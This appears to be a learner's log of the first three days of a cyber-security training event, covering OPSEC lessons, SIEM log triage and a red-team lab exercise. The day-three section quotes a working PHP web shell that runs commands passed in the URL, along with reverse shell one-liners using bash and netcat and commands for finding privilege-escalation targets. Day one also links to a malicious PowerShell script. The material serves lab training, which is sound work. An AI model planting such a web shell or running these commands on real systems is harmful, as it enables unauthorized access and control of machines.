# AdventOfCyber #
My little log of tasks for future reference and whatnot

### DAY ONE ###
Day one was a mostly pretty nicely put introduction to the environment and OPSEC in general. The tasks at hand required use of `file` and `exiftool` to gather information. We had to try figuring out stuff from github profiles and whatnot and learned how to go deeper by figuring out where the crumbles go to figure out the 'identity' of the character. It's starting to look it's going to be a fun little story.

More to the point - the `somg.mp3` file was instead a `.lnk` file that pointed to dowload a file from github and run it, thus 'infecting' the target pc with [THIS](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1). It has a vanity card and it even is signed so we had to go on github and search for that line to find a profile and then follow it to figure out the 'name'. We also got a nice introduction to OPSEC


>Operational Security (OPSEC) is a term originally coined in the military to refer to the process of protecting sensitive information and operations from adversaries. The goal is to identify and eliminate potential vulnerabilities before the attacker can learn their identity.
>
>In the context of cyber security, when malicious actors fail to follow proper OPSEC practices, they might leave digital traces that can be pieced together to reveal their identity. Some common OPSEC mistakes include:
>
>* Reusing usernames, email addresses, or account handles across multiple platforms. One might assume that anyone trying to cover their tracks would remove such obvious and incriminating information, but sometimes, it's due to vanity or simply forgetfulness.
>* Using identifiable metadata in code, documents, or images, which may reveal personal information like device names, GPS coordinates, or timestamps.
>* Posting publicly on forums or GitHub (Like in this current scenario) with details that tie back to their real identity or reveal their location or habits.
>*    Failing to use a VPN or proxy while conducting malicious activities allows law enforcement to track their real IP address.
>
>You'd think that someone doing something bad would make OPSEC their top priority, but they're only human and can make mistakes, too.

It then follows a couple of real cases as examples of how *NOT* to do opsec:

>For example, here are some real-world OPSEC mistakes that led to some really big fails:
>### AlphaBay Admin Takedown ###
>
>One of the most spectacular OPSEC failures involved Alexandre Cazes, the administrator of AlphaBay, one of the largest dark web marketplaces:
>
>*    Cazes used the email address "pimp_alex_91@hotmail.com" in early welcome emails from the site.
>*    This email included his year of birth and other identifying information.
>*    He cashed out using a Bitcoin account tied to his real name.
>*    Cazes reused the username "Alpha02" across multiple platforms, linking his dark web identity to forum posts under his real name.
>
>### Chinese Military Hacking Group (APT1) ###
>
>There's also the notorious Chinese hacking group APT1, which made several OPSEC blunders:
>
>*    One member, Wang Dong, signed his malware code with the nickname "Ugly Gorilla".
>*    This nickname was linked to programming forum posts associated with his real name.
>*    The group used predictable naming conventions for users, code, and passwords.
>*    Their activity consistently aligned with Beijing business hours, making their location obvious.
>
>These failures provided enough information for cyber security researchers and law enforcement to publicly identify group members.

### DAY TWO ###

Day two starts with more introductions - this time it introduces the true-positive and false-positive concept of detecting and assessing the types of activity by security. FP when it's malicious activity and all hell can break loose. TP on sysadmin can make people mad. But then again - if it's legit a phonecall or email beforehand can help mitigate such situations. If it's not legit there won't be any response, right? But yeah, it's not all fun and games as there are so many variables that need the person in charge to do a lot of correlation and digging. Some things are more suspicious than others.
The activity itself had us 'login' to a SIEM \(Security Information and Event Management\) system and investigate some events that have been recorded. They also show us how to create columns so the logs are more readable, which is nice. We learn how to filter some more, gradually getting to the information about the source and whatnot, allowing us to identify malicious activity and we go even deeper, even identifying the powershell command that needed to be decoded and whatnot. Useful tool - [CyberChef](https://gchq.github.io/CyberChef/). For non-critical stuff, nothing personal or real it's okay to use that instance but to be sure it's better to have a local copy that runs completely locally. It can be had from [HERE](https://gchq.github.io/CyberChef/CyberChef_v10.19.4.zip). Anywho - we learn how to use that tool to decode Base64 - `FromBase64` and `Decode text` 'recipes' are needed to do that.

### DAY THREE ###

Third day started with a small recap of blue teaming and then we got to red teaming too. So that was more hands on and it gave me quite some fun! I poked and prodded around and now I know even more than bafore and getting the right idea is over half of the battle. Basically we had to figure out how the 'attacker' got the shell inside and do the same, using the code below to cat one file. Also I kinda feel like the question about IP is mislabeled as RED TEAM when info from that is only available in logs. And RED TEAMERS should know their IPs already...

Reverse shell.php:
>```html
><html>
><body>
><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
><input type="text" name="command" autofocus id="command" size="50">
><input type="submit" value="Execute">
></form>
><pre>
><?php
>    if(isset($_GET['command'])) 
>    {
>        system($_GET['command'] . ' 2>&1'); 
>    }
>?>
></pre>
></body>
></html>
>```
Useful commands:
>| Command |	Use |
>| --- | --- |
>| `ls` | 	Will give you an idea of what files/directories surround you |
>| `pwd` | 	Will give you an idea of where in the system you are |
>| `whoami` | 	Will let you know who you are in the system |
>| `hostname` | 	The system name and potentially its role in the network |
>| `uname -a` | 	Will give you some system information like the OS, kernel version, and more |
>| `id` | 	If the current user is assigned to any groups |
>| `ifconfig` | 	Allows you to understand the system's network setup |
>| `bash -i >& /dev/tcp/<your-ip>/<port> 0>&1` | 	A command used to begin a reverse shell via bash |
>| `nc -e /bin/sh <your-ip> <port>` | 	A command used to begin a reverse shell via Netcat |
>| `find / -perm -4000 -type f 2>/dev/null` | 	Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root) |
>| `find / -writable -type  f 2>/dev/null \| grep -v "/proc/"` | 	Also helpful in privilege escalation attempts used to find files with writable permissions |

### DAY FOUR ###

### DAY FIVE ###
 
### DAY SIX ###

### DAY SEVEN ###

### DAY EIGHT ###

### DAY NINE ###

### DAY TEN ###

### DAY ELEVEN ###

### DAY TWELVE ###

### DAY THIRTEEN ###

### DAY FOURTEEN ###

### DAY FIFTEEN ###

### DAY SIXTEEN ###

### DAY SEVENTEEN ###

### DAY EIGHTEEN ###

### DAY NINETEEN ###

### DAY TWENTY ###

### DAY TWENTYONE ###

### DAY TWENTYTWO ###

### DAY TWENTYTHREE ###

### DAY TWENTYFOUR ###
